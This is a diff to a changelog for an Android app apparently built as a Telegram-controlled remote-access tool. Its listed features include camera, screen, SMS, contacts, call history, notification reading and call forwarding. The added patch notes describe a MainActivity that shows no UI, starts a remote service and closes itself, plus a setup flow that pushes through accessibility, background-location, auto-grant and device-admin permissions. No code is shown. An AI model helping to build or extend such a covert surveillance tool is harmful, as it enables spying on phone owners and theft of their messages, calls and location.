@@ -190,3 +190,21 @@ Platform: Sketchware Pro (daydream v7), package `mata.pro`, files in `.sketchwar
 - **Added Notifications & Calls section** — Read Notifs, Call Forward, Stop CF buttons
 - **Server.js** — already supports all view routes (hub, cam, screen, files, sms, applist, contactlist, callhist, gallery, control)
 - **Git pushed** to github.com/ZeronModz/zeronremote.git (forced push due to divergent branches)
+
+### V7.0 Patch (2026-08-24) — Telegram HTML Formatting + MainActivity + AutoSetup UI
+- **Telegram Bot HTML formatting** — `sendHtml()` method with `parse_mode=HTML`
+  - Helper methods: `hBold`, `hItalic`, `hUnder`, `hStrike`, `hCode`, `hPre`, `hLink`, `hQuote`, `hSpoiler`, `hSep`, `hLine`
+  - `helpText()` rewritten with HTML (all sections, 80+ commands, beautiful formatting)
+  - `sendStatus()` rewritten with HTML (device status, permissions, battery, device info)
+  - `/start` and `/help` now use `sendHtml(chat, helpText())`
+- **MainActivity.java** (NEW) — app entry point:
+  - Launches `AutoSetupActivity` on first open
+  - Starts `TelegramRemoteService`
+  - Finishes itself (no UI)
+- **AutoSetupActivity.java** rewrite — visual progress UI:
+  - Dark theme layout with step-by-step status
+  - Shows ✓ GRANTED / REQUESTING... / NEEDS MANUAL for each permission
+  - Better flow: Runtime → Background Location → Accessibility → Auto-Grant → Battery Opt → Device Admin
+  - 2-second delay before finish (user can see results)
+- **Files**: `MainActivity.java` (NEW, 30 lines), `AutoSetupActivity.java` (rewrite, 250 lines)
+- **Compile**: clean (pre-existing okio only)
